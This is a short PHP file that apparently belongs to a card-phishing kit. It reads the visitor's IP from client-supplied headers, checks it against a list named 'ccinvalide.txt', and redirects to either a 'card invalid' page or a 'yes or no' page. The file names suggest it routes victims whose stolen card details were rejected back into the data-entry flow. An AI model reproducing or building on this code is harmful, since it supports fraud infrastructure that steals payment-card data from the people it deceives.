<?php 
include("../infos.php");
include("../common/sub_includes.php");

if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
    $IP = $_SERVER['HTTP_CLIENT_IP'];
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $IP = $_SERVER['HTTP_X_FORWARDED_FOR'];
} else {
    $IP = $_SERVER['REMOTE_ADDR'];
}
$link_file = "../functions/ccinvalide.txt";
$bannedip = file($link_file, FILE_IGNORE_NEW_LINES);
$bannedip = array_map("str_getcsv", $bannedip);
$bannedip = array_column($bannedip, null, 0);
if(isset($bannedip[$IP])) {
    header('Location: ./cardinva.php.php');
}
else{
    header('Location: ./ouiounon.php');
}
?>